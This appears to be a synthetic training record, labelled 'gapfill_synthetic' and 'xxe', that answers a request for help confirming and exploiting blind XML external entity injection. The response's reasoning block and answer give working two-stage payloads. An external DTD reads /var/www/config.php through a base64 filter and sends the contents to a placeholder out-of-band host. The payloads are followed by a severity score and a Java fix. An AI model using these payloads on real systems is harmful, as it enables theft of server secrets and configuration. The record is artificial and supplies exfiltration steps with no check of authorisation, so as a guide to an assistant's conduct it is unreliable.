# XXE — gapfill_synthetic

- source: gapfill_synthetic
- class: xxe

## Scenario

An endpoint accepts SAML-like XML I control. No DTD errors returned (blind). How do I confirm XXE and exfiltrate without in-band reflection?

## Analysis / Response

<think>
Blind XXE → can't read the file in the response, so out-of-band via an external DTD and parameter entities. Classic two-stage: an external parameter entity loads my DTD, which defines an entity embedding file contents into a URL my server receives. Note: many parsers block external *general* entities but still fetch *parameter* entities; php://filter base64-encodes so the XML stays well-formed. Must confirm via OAST before claiming read. Severity depends on reachable files.
</think>

**Blind XXE** — confirm and exfiltrate via OOB external DTD.

**Stage 1 (to target):**
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://OAST/x.dtd"> %ext;]>
<r>1</r>
```
**Stage 2 (x.dtd on your server):**
```xml
<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/var/www/config.php">
<!ENTITY % w "<!ENTITY &#x25; send SYSTEM 'http://OAST/?d=%f;'>">
%w; %send;
```
A callback to `OAST/?d=<base64>` confirms file read.

**Root cause:** parser resolves external (parameter) entities; DOCTYPE/external DTD processing enabled.

**Impact:** read of server secrets/config; frequent SSRF pivot.

**Severity:** High→Critical — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 (higher if creds leak).

**Fix:** disable DTDs — Java `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true)`.
**Edge case:** if parameter entities are blocked but errors leak, fall back to error-based local-DTD exfiltration.
